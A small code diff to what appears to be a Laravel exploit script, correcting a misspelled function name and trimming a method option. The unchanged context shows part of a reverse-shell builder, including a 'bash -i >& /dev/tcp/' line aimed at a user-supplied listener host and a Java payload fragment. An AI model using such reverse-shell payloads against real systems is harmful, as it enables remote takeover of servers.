@@ -135,7 +135,7 @@ if __name__ == "__main__":
         default=1,
         type=int,
         choices=[
-            1, 2, 3, 4, 5
+            1, 2, 3, 4
         ],
         help="The laravel method"
     )
@@ -173,7 +173,7 @@ if __name__ == "__main__":
     # Check if user wants shell
     if arguments.shell is not None:
 
-        def switchReversheShell(shell):
+        def switchReverseShell(shell):
             switcher = {
                 "bash": "bash -i >& /dev/tcp/"
                 + str(arguments.lhost)
@@ -238,7 +238,7 @@ p.waitFor()""",
             }
             return switcher.get(shell, "Invalid shell")
 
-        reverseShell = switchReversheShell(arguments.shell)
+        reverseShell = switchReverseShell(arguments.shell)
 
         log.info("Lhost: "+arguments.lhost)
         if (arguments.lhost == "127.0.0.1"):
